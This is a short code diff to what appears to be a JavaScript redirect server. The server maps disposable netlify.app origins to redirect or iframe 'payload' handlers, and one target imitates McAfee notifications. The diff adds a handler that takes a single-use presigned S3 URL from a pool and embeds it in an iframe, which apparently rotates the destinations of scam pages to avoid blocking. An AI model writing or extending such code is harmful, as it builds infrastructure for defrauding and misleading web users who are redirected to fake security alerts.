@@ -53,10 +53,12 @@ redis.on("error", (err) => console.error("Redis error:", err.message));
 // ─── Origin groups ────────────────────────────────────────────────
 // Each origin maps to { method, target }. `method` selects which
 // buildPayload handler runs (see BUILD_PAYLOAD_HANDLERS below):
-//   - "iframe":   embed `target` in an iframe
-//   - "redirect": window.location.replace(target)
-//   - "s3ap":     pop a unique presigned URL from the AP pool and
-//                 redirect to it (target is ignored)
+//   - "iframe":      embed `target` in an iframe
+//   - "redirect":    window.location.replace(target)
+//   - "s3ap":        pop a unique presigned URL from the AP pool and
+//                    redirect to it (target is ignored)
+//   - "iframes3ap":  pop a unique presigned URL from the AP pool and
+//                    embed it in an iframe (target is ignored)
 const ORIGIN_GROUPS = {
   rocky: {
     "https://cheery-douhua-d9bd03.netlify.app": { method: "redirect", target: "https://mcafeenotifications.onrender.com" },
@@ -563,6 +565,11 @@ const BUILD_PAYLOAD_HANDLERS = {
     const presigned = await nextPresignedUrl();
     if (!presigned) return null;
     return buildPayloadRedirect(presigned);
+  },
+  iframes3ap: async () => {
+    const presigned = await nextPresignedUrl();
+    if (!presigned) return null;
+    return buildPayloadIframe(presigned);
   },
 };
 
